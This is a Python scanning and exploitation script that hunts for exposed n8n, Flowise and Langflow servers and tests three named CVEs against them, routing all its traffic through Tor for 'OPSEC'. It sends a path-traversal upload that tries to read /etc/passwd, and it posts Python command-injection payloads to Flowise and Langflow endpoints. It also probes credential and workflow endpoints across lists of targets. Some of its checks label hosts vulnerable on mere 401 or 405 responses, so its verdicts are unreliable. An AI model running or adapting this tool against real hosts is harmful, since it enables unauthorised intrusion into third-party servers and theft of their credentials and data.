#!/usr/bin/env python3
"""
N8N + Flowise + Langflow Hunter v1.0
=====================================
Scans for exposed n8n, Flowise, and Langflow instances.
Tests CVE-2026-21858 (n8n), CVE-2025-59528 (Flowise), CVE-2026-33017 (Langflow).
Checks /rest/settings, /api/v1, /api/v1/workflows endpoints.
Uses Tor SOCKS5 proxy for OPSEC.
Author: admin_user
"""

import requests
import json
import sys
import time
from datetime import datetime
from urllib.parse import urljoin

# OPSEC: Route through Tor
PROXIES = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}
TIMEOUT = 15
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/html, */*"
}

# ============================================================================
# n8n Detection & CVE-2026-21858 Testing
# ============================================================================
N8N_CHECKS = {
    "settings": "/rest/settings",
    "workflows_list": "/rest/workflows",
    "credentials": "/rest/credentials",
    "executions": "/rest/executions",
    "active_workflows": "/rest/active-workflows",
    "version": "/rest/systemInfo",
    "webhook_test": "/webhook",
    "webhook_test_post": "/webhook-test",
    "login": "/rest/login",
    "signin": "/signin",
    "license": "/rest/license"
}

def check_n8n(base_url):
    """Check if target is n8n and test for CVE-2026-21858"""
    results = {
        "service": "n8n",
        "base_url": base_url,
        "detected": False,
        "version": None,
        "endpoints": {},
        "cve_2026_21858": {"vulnerable": False, "evidence": []},
        "info_disclosure": []
    }
    
    # Check main page
    try:
        r = requests.get(base_url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if "n8n" in r.text.lower() or "n8n" in r.headers.get("server", "").lower():
            results["detected"] = True
        if r.status_code == 200:
            # Extract version from page source
            import re
            version_match = re.search(r'"version":\s*"([0-9.]+)"', r.text)
            if version_match:
                results["version"] = version_match.group(1)
    except Exception as e:
        results["error"] = str(e)
        return results
    
    # Check endpoints
    for name, path in N8N_CHECKS.items():
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
            results["endpoints"][name] = {
                "status": r.status_code,
                "content_length": len(r.text),
                "accessible": r.status_code == 200
            }
            
            # CVE-2026-21858: /rest/settings accessible without auth
            if name == "settings" and r.status_code == 200:
                results["cve_2026_21858"]["vulnerable"] = True
                results["cve_2026_21858"]["evidence"].append({
                    "endpoint": url,
                    "status": 200,
                    "response_preview": r.text[:500]
                })
                try:
                    settings = r.json()
                    results["info_disclosure"].append({
                        "endpoint": "/rest/settings",
                        "data": {k: v for k, v in settings.items() 
                                if k in ["version", "oauthType", "oauthEnabled", "publicApiEnabled", 
                                         "instanceId", "deploymentType", "releaseChannel"]}
                    })
                except:
                    pass
            
            # Check for version in any endpoint
            if results["version"] is None:
                version_match = re.search(r'"version":\s*"([0-9.]+)"', r.text)
                if version_match:
                    results["version"] = version_match.group(1)
                    
        except Exception as e:
            results["endpoints"][name] = {"error": str(e)}
    
    # CVE-2026-21858: Test webhook file read
    # Send multipart request with overridden content-type
    try:
        webhook_url = urljoin(base_url, "/webhook")
        files = {'file': ('../../etc/passwd', 'test', 'text/plain')}
        r = requests.post(webhook_url, files=files, headers=HEADERS, 
                         proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if "root:" in r.text:
            results["cve_2026_21858"]["vulnerable"] = True
            results["cve_2026_21858"]["evidence"].append({
                "type": "webhook_file_read",
                "endpoint": webhook_url,
                "status": r.status_code,
                "response_preview": r.text[:300]
            })
    except:
        pass
    
    return results

# ============================================================================
# Flowise Detection & CVE-2025-59528 Testing
# ============================================================================
FLOWISE_CHECKS = {
    "api_health": "/api/v1",
    "chatflows": "/api/v1/chatflows",
    "workflows": "/api/v1/workflows",
    "predictions": "/api/v1/predictions",
    "credentials": "/api/v1/credentials",
    "nodes": "/api/v1/nodes",
    "custom_mcp": "/api/v1/node-load-method/customMCP",
    "marketplace": "/api/v1/marketplace",
    "config": "/api/v1/config",
    "version": "/api/v1/version"
}

def check_flowise(base_url):
    """Check if target is Flowise and test for CVE-2025-59528"""
    results = {
        "service": "Flowise",
        "base_url": base_url,
        "detected": False,
        "version": None,
        "endpoints": {},
        "cve_2025_59528": {"vulnerable": False, "evidence": []},
        "info_disclosure": []
    }
    
    # Check main page
    try:
        r = requests.get(base_url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if "flowise" in r.text.lower() or "flowiseai" in r.text.lower():
            results["detected"] = True
    except Exception as e:
        results["error"] = str(e)
        return results
    
    # Check endpoints
    for name, path in FLOWISE_CHECKS.items():
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
            results["endpoints"][name] = {
                "status": r.status_code,
                "content_length": len(r.text),
                "accessible": r.status_code == 200
            }
            
            # CVE-2025-59528: customMCP endpoint accessible
            if name == "custom_mcp" and r.status_code in [200, 401, 405]:
                results["cve_2025_59528"]["vulnerable"] = True
                results["cve_2025_59528"]["evidence"].append({
                    "endpoint": url,
                    "status": r.status_code,
                    "response_preview": r.text[:300]
                })
            
            # Check chatflows list (info disclosure)
            if name == "chatflows" and r.status_code == 200:
                try:
                    flows = r.json()
                    results["info_disclosure"].append({
                        "endpoint": "/api/v1/chatflows",
                        "flow_count": len(flows) if isinstance(flows, list) else "unknown"
                    })
                except:
                    pass
                    
        except Exception as e:
            results["endpoints"][name] = {"error": str(e)}
    
    # CVE-2025-59528: Test customMCP POST injection
    try:
        mcp_url = urljoin(base_url, "/api/v1/node-load-method/customMCP")
        payload = {
            "category": "CustomMCP",
            "input": "__import__('os').system('id')"
        }
        r = requests.post(mcp_url, json=payload, headers=HEADERS, 
                         proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if r.status_code in [200, 500]:
            results["cve_2025_59528"]["evidence"].append({
                "type": "customMCP_injection",
                "endpoint": mcp_url,
                "status": r.status_code,
                "response_preview": r.text[:300]
            })
    except:
        pass
    
    return results

# ============================================================================
# Langflow Detection & CVE-2026-33017 Testing
# ============================================================================
LANGFLOW_CHECKS = {
    "api_health": "/api/v1",
    "flows": "/api/v1/flows",
    "config": "/api/v1/config",
    "version": "/api/v1/version",
    "login": "/api/v1/login",
    "auto_login": "/api/v1/auto_login",
    "build": "/api/v1/build",
    "process": "/api/v1/process",
    "public_flows": "/api/v1/flows/public",
    "validate": "/api/v1/validate"
}

def check_langflow(base_url):
    """Check if target is Langflow and test for CVE-2026-33017"""
    results = {
        "service": "Langflow",
        "base_url": base_url,
        "detected": False,
        "version": None,
        "endpoints": {},
        "cve_2026_33017": {"vulnerable": False, "evidence": []},
        "info_disclosure": []
    }
    
    # Check main page
    try:
        r = requests.get(base_url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if "langflow" in r.text.lower():
            results["detected"] = True
    except Exception as e:
        results["error"] = str(e)
        return results
    
    # Check endpoints
    for name, path in LANGFLOW_CHECKS.items():
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, proxies=PROXIES, timeout=TIMEOUT, verify=False)
            results["endpoints"][name] = {
                "status": r.status_code,
                "content_length": len(r.text),
                "accessible": r.status_code == 200
            }
            
            # Auto-login endpoint accessible = potential AUTO_LOGIN enabled
            if name == "auto_login" and r.status_code == 200:
                results["info_disclosure"].append({
                    "endpoint": "/api/v1/auto_login",
                    "note": "AUTO_LOGIN enabled - potential auth bypass"
                })
            
            # Public flows accessible
            if name == "public_flows" and r.status_code == 200:
                try:
                    flows = r.json()
                    results["cve_2026_33017"]["evidence"].append({
                        "type": "public_flows_accessible",
                        "endpoint": url,
                        "flow_count": len(flows) if isinstance(flows, list) else "unknown"
                    })
                except:
                    pass
            
            # Build endpoint accessible = potential RCE
            if name == "build" and r.status_code in [200, 405, 422]:
                results["cve_2026_33017"]["vulnerable"] = True
                results["cve_2026_33017"]["evidence"].append({
                    "type": "build_endpoint_accessible",
                    "endpoint": url,
                    "status": r.status_code,
                    "response_preview": r.text[:300]
                })
                
        except Exception as e:
            results["endpoints"][name] = {"error": str(e)}
    
    # CVE-2026-33017: Test exec injection via build endpoint
    try:
        build_url = urljoin(base_url, "/api/v1/build")
        payload = {
            "id": "test-exec",
            "data": {"python": "__import__('os').system('id')"}
        }
        r = requests.post(build_url, json=payload, headers=HEADERS,
                         proxies=PROXIES, timeout=TIMEOUT, verify=False)
        if r.status_code in [200, 201, 500]:
            results["cve_2026_33017"]["evidence"].append({
                "type": "exec_injection_test",
                "endpoint": build_url,
                "status": r.status_code,
                "response_preview": r.text[:300]
            })
    except:
        pass
    
    return results


def scan_target(target_url):
    """Scan a single target for all three services"""
    results = {
        "target": target_url,
        "timestamp": datetime.utcnow().isoformat(),
        "n8n": None,
        "flowise": None,
        "langflow": None
    }
    
    print(f"\n{'='*60}")
    print(f"SCANNING: {target_url}")
    print(f"{'='*60}")
    
    # Try n8n detection
    print("[*] Checking n8n...")
    results["n8n"] = check_n8n(target_url)
    if results["n8n"]["detected"] or any(
        e.get("accessible", False) for e in results["n8n"]["endpoints"].values() 
        if isinstance(e, dict)
    ):
        print(f"  [+] n8n DETECTED! Version: {results['n8n'].get('version', 'unknown')}")
        if results["n8n"]["cve_2026_21858"]["vulnerable"]:
            print(f"  [!] CVE-2026-21858 VULNERABLE!")
    else:
        print(f"  [-] n8n not detected")
    
    # Try Flowise detection
    print("[*] Checking Flowise...")
    results["flowise"] = check_flowise(target_url)
    if results["flowise"]["detected"] or any(
        e.get("accessible", False) for e in results["flowise"]["endpoints"].values()
        if isinstance(e, dict)
    ):
        print(f"  [+] Flowise DETECTED! Version: {results['flowise'].get('version', 'unknown')}")
        if results["flowise"]["cve_2025_59528"]["vulnerable"]:
            print(f"  [!] CVE-2025-59528 VULNERABLE!")
    else:
        print(f"  [-] Flowise not detected")
    
    # Try Langflow detection
    print("[*] Checking Langflow...")
    results["langflow"] = check_langflow(target_url)
    if results["langflow"]["detected"] or any(
        e.get("accessible", False) for e in results["langflow"]["endpoints"].values()
        if isinstance(e, dict)
    ):
        print(f"  [+] Langflow DETECTED! Version: {results['langflow'].get('version', 'unknown')}")
        if results["langflow"]["cve_2026_33017"]["vulnerable"]:
            print(f"  [!] CVE-2026-33017 VULNERABLE!")
    else:
        print(f"  [-] Langflow not detected")
    
    return results


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 n8n_flowise_langflow_hunter.py <target_url> [target2 ...]")
        print("       python3 n8n_flowise_langflow_hunter.py --file <targets_file>")
        print("\nExample targets:")
        print("  http://target.com:5678  (n8n default)")
        print("  http://target.com:3000  (Flowise default)")
        print("  http://target.com:7860  (Langflow default)")
        sys.exit(1)
    
    targets = []
    if sys.argv[1] == "--file" and len(sys.argv) > 2:
        with open(sys.argv[2]) as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = sys.argv[1:]
    
    all_results = []
    for target in targets:
        if not target.startswith("http"):
            target = f"http://{target}"
        result = scan_target(target)
        all_results.append(result)
    
    # Save results
    output_file = f"/home/admin_user/Projects/ai_infra_scan/findings/n8n_flowise_langflow_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, "w") as f:
        json.dump(all_results, f, indent=2, default=str)
    
    print(f"\n\n{'='*60}")
    print(f"RESULTS SAVED: {output_file}")
    print(f"{'='*60}")
    
    # Summary
    n8n_found = sum(1 for r in all_results if r["n8n"]["detected"])
    flowise_found = sum(1 for r in all_results if r["flowise"]["detected"])
    langflow_found = sum(1 for r in all_results if r["langflow"]["detected"])
    n8n_vuln = sum(1 for r in all_results if r["n8n"]["cve_2026_21858"]["vulnerable"])
    flowise_vuln = sum(1 for r in all_results if r["flowise"]["cve_2025_59528"]["vulnerable"])
    langflow_vuln = sum(1 for r in all_results if r["langflow"]["cve_2026_33017"]["vulnerable"])
    
    print(f"\nSUMMARY:")
    print(f"  n8n instances found:     {n8n_found}")
    print(f"  Flowise instances found:  {flowise_found}")
    print(f"  Langflow instances found: {langflow_found}")
    print(f"  CVE-2026-21858 (n8n):    {n8n_vuln} vulnerable")
    print(f"  CVE-2025-59528 (Flowise): {flowise_vuln} vulnerable")
    print(f"  CVE-2026-33017 (Langflow): {langflow_vuln} vulnerable")


if __name__ == "__main__":
    main()